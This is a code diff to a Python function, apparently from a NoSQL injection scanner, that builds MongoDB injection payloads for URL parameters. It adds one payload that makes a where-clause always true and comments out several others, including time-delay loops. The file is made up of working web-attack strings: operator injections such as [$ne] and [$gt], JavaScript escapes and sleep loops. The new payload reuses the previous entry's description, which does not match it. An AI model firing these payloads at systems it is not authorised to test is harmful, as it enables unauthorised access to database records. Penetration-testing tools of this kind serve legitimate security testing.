@@ -1,6 +1,6 @@
 def buildAttackUri(origUri, randValue):
-    attackSum = 18
-    attackEffectiveSum = 8
+    attackSum = 19
+    attackEffectiveSum = 9
     attackSet=["","","","","","","","","","","","","","","","","","",""]
     attackSet[0] = "=" + randValue + "&"#normal uri which be used to test the length of response
     attackSet[1] = "[$ne]=" + randValue + "&"
@@ -11,16 +11,18 @@ def buildAttackUri(origUri, randValue):
     attackSet[6]="=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
     attackSet[7]="=1; return this.a !=" + randValue + "; var dummy=1" + "&"
     attackSet[8]="[$gt]=1&"
-    attackSet[9]="=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-    attackSet[10]="=a\"; return db.a.find(); var dummy='!" + "&"
-    attackSet[11]="=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
-    attackSet[12]="=a\"; return db.a.findOne(); var dummy=\"!" + "&"
-    attackSet[13]="=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-    attackSet[14]="a'; return true; var dum='a"
-    attackSet[15]="1; return true; var dum=2"
-    attackSet[16]="=a\'; ---"
-    attackSet[17]="=1; if ---"
-    attackSet[18]="=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+    attackSet[9] = "=2;return%20true;}///"
+#    attackSet[9]="=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
+#    attackSet[10]="=a\"; return db.a.find(); var dummy='!" + "&"
+#    attackSet[11]="=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
+#    attackSet[12]="=a\"; return db.a.findOne(); var dummy=\"!" + "&"
+#    attackSet[13]="=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
+#    attackSet[14]="a'; return true; var dum='a"
+#    attackSet[15]="1; return true; var dum=2"
+#    attackSet[16]="=a\'; ---"
+#    attackSet[17]="=1; if ---"
+#    attackSet[18]="=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+
     paramName = []
     paramValue = []
     uriArray = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
@@ -76,6 +78,7 @@ def buildAttackUri(origUri, randValue):
     attackDescriptionSet[6] = "Testing Mongo this not equals string escape attack for all records...\n" + "Injecting " + uriArray[6]
     attackDescriptionSet[7] = "Testing Mongo this not equals integer escape attack for all records...\n" + "Injecting " + uriArray[7]
     attackDescriptionSet[8] = "Testing PHP/ExpressJS > undefined attack for all records...\n" + "Injecting " + uriArray[8]
+    attackDescriptionSet[9] = "Testing PHP/ExpressJS > undefined attack for all records...\n" + "Injecting " + uriArray[9]
     buildAttackSet = [[],[]]
     buildAttackSet[0] = uriArray
     buildAttackSet[1] = attackDescriptionSet;
